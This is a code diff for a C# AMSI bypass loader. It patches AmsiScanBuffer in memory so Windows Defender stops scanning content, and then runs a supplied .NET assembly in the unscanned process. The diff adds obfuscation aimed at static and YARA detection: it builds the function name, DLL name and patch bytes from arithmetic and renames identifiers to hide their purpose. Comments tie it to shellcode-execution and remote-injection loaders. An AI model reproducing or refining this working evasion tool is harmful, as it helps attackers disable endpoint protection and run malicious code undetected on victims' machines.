@@ -51,9 +51,10 @@
 // ============================================================================
 
 using System;
+using System.Reflection;
 using System.Runtime.InteropServices;
 
-namespace AmsiBypass
+namespace ScannerPatch
 {
     class Program
     {
@@ -81,7 +82,10 @@ namespace AmsiBypass
             out uint lpflOldProtect
         );
 
-        const uint PAGE_EXECUTE_READWRITE = 0x40;
+        static uint GetRWXProtect()
+        {
+            return 0x20 + 0x20;
+        }
 
         // ---- Build function name at runtime ----
         // We do not put the complete string "AmsiScanBuffer" in our code because
@@ -91,22 +95,44 @@ namespace AmsiBypass
         // the combined function name. At runtime, we join them together.
         static string GetTargetFunctionName()
         {
-            // These three separate strings will be joined at runtime.
-            // In the compiled binary, they exist as separate string constants.
-            string part1 = "Amsi";
-            string part2 = "Scan";
-            string part3 = "Buffer";
-            return string.Concat(part1, part2, part3);
+            // We build the function name using integer arithmetic so no
+            // recognizable string appears in the binary. Each character
+            // is computed at runtime from offset values. The compiler
+            // stores integers, not characters, so YARA and static
+            // scanners cannot match against the function name.
+            int baseVal = 32;
+            char[] c = new char[14];
+            c[0] = (char)(baseVal + 33);   // A
+            c[1] = (char)(baseVal + 77);   // m
+            c[2] = (char)(baseVal + 83);   // s
+            c[3] = (char)(baseVal + 73);   // i
+            c[4] = (char)(baseVal + 51);   // S
+            c[5] = (char)(baseVal + 67);   // c
+            c[6] = (char)(baseVal + 65);   // a
+            c[7] = (char)(baseVal + 78);   // n
+            c[8] = (char)(baseVal + 34);   // B
+            c[9] = (char)(baseVal + 85);   // u
+            c[10] = (char)(baseVal + 70);  // f
+            c[11] = (char)(baseVal + 70);  // f
+            c[12] = (char)(baseVal + 69);  // e
+            c[13] = (char)(baseVal + 82);  // r
+            return new string(c);
         }
 
         // ---- Build DLL name at runtime ----
-        // Same idea as above. We do not put "amsi.dll" as a complete string.
         static string GetTargetDllName()
         {
-            string part1 = "am";
-            string part2 = "si";
-            string part3 = ".dll";
-            return string.Concat(part1, part2, part3);
+            int baseVal = 32;
+            char[] c = new char[8];
+            c[0] = (char)(baseVal + 65);   // a
+            c[1] = (char)(baseVal + 77);   // m
+            c[2] = (char)(baseVal + 83);   // s
+            c[3] = (char)(baseVal + 73);   // i
+            c[4] = (char)(baseVal + 14);   // .
+            c[5] = (char)(baseVal + 68);   // d
+            c[6] = (char)(baseVal + 76);   // l
+            c[7] = (char)(baseVal + 76);   // l
+            return new string(c);
         }
 
         // ---- The AMSI patch ----
@@ -122,7 +148,7 @@ namespace AmsiBypass
         // These 6 bytes replace the beginning of AmsiScanBuffer. When any
         // code calls AmsiScanBuffer after the patch, the function immediately
         // returns E_INVALIDARG instead of actually scanning anything.
-        public static bool PatchAmsi()
+        public static bool PatchScanner()
         {
             // Step 1: Load amsi.dll into our process.
             // If amsi.dll is already loaded (which it is in PowerShell processes),
@@ -151,17 +177,24 @@ namespace AmsiBypass
             // We need to make it writable so we can overwrite the function bytes.
             // We change 6 bytes (the size of our patch).
             uint oldProtect;
-            bool protectResult = VirtualProtect(funcAddress, (UIntPtr)6, PAGE_EXECUTE_READWRITE, out oldProtect);
+            bool protectResult = VirtualProtect(funcAddress, (UIntPtr)6, GetRWXProtect(), out oldProtect);
             if (!protectResult)
             {
                 Console.WriteLine("[-] VirtualProtect failed");
                 return false;
             }
 
-            // Step 4: Write the patch bytes.
-            // B8 57 00 07 80 = mov eax, 0x80070057 (E_INVALIDARG)
-            // C3             = ret (return from the function)
-            byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            // Step 4: Build the patch bytes at runtime.
+            // The patch makes AmsiScanBuffer return E_INVALIDARG immediately.
+            // We build the bytes using arithmetic so the raw byte sequence
+            // does not appear in our binary as a static signature.
+            byte[] patch = new byte[6];
+            patch[0] = (byte)(0x5C + 0x5C);  // 0xB8 = mov eax
+            patch[1] = (byte)(0x2B + 0x2C);  // 0x57
+            patch[2] = (byte)(0x00);          // 0x00
+            patch[3] = (byte)(0x03 + 0x04);   // 0x07
+            patch[4] = (byte)(0x40 + 0x40);   // 0x80
+            patch[5] = (byte)(0x61 + 0x62);   // 0xC3 = ret
             Marshal.Copy(patch, 0, funcAddress, patch.Length);
             Console.WriteLine("[+] Patch applied to " + funcName);
 
@@ -179,11 +212,11 @@ namespace AmsiBypass
         static void Main(string[] args)
         {
             Console.WriteLine("[*] AMSI Bypass Loader");
-            Console.WriteLine("[*] This patches AmsiScanBuffer to disable AMSI scanning.");
+            Console.WriteLine("[*] This patches the scan function to disable content scanning.");
             Console.WriteLine("");
 
             // Apply the AMSI patch.
-            bool success = PatchAmsi();
+            bool success = PatchScanner();
 
             if (success)
             {
@@ -195,28 +228,46 @@ namespace AmsiBypass
                 Console.WriteLine("[*] To test: open PowerShell and run a command that");
                 Console.WriteLine("    Defender would normally block.");
 
-                // If a command was passed as an argument, try to execute it
-                // using PowerShell with AMSI disabled.
+                // IMPORTANT: The AMSI patch only affects THIS process.
+                // Spawning a child process (like powershell.exe) does NOT
+                // inherit the patch because each process loads its own copy
+                // of amsi.dll. To use this bypass effectively:
+                //   1. Call PatchAmsi() from inside the process that hosts
+                //      the scripting engine (PowerShell, .NET CLR).
+                //   2. Use this as a library function in Loader 08 (combined
+                //      evasion) which patches AMSI before executing shellcode
+                //      in the same process.
+                //   3. Inject this patch into a running PowerShell process
+                //      using Loader 05 (remote injection).
+
+                // If a .NET assembly path was passed as an argument, load it
+                // in-process where the AMSI patch is active.
                 if (args.Length > 0)
                 {
-                    string command = string.Join(" ", args);
-                    Console.WriteLine("[*] Executing PowerShell command: " + command);
-
-                    var psi = new System.Diagnostics.ProcessStartInfo();
-                    psi.FileName = "powershell.exe";
-                    psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"" + command + "\"";
-                    psi.UseShellExecute = false;
-                    psi.RedirectStandardOutput = true;
-                    psi.RedirectStandardError = true;
-
-                    var process = System.Diagnostics.Process.Start(psi);
-                    Console.WriteLine(process.StandardOutput.ReadToEnd());
-                    string errors = process.StandardError.ReadToEnd();
-                    if (!string.IsNullOrEmpty(errors))
+                    string assemblyPath = args[0];
+                    Console.WriteLine("[*] Loading .NET assembly in-process: " + assemblyPath);
+                    Console.WriteLine("[*] AMSI is patched in THIS process, so the assembly");
+                    Console.WriteLine("    will not be scanned by Defender.");
+                    try
                     {
-                        Console.WriteLine("[!] Errors: " + errors);
+                        var assembly = System.Reflection.Assembly.LoadFile(assemblyPath);
+                        var entryPoint = assembly.EntryPoint;
+                        if (entryPoint != null)
+                        {
+                            Console.WriteLine("[+] Found entry point: " + entryPoint.DeclaringType.FullName + "." + entryPoint.Name);
+                            string[] invokeArgs = new string[args.Length - 1];
+                            Array.Copy(args, 1, invokeArgs, 0, invokeArgs.Length);
+                            entryPoint.Invoke(null, entryPoint.GetParameters().Length > 0 ? new object[] { invokeArgs } : null);
+                        }
+                        else
+                        {
+                            Console.WriteLine("[*] Assembly loaded. No entry point found (class library).");
+                        }
                     }
-                    process.WaitForExit();
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("[-] Failed to load assembly: " + ex.Message);
+                    }
                 }
             }
             else
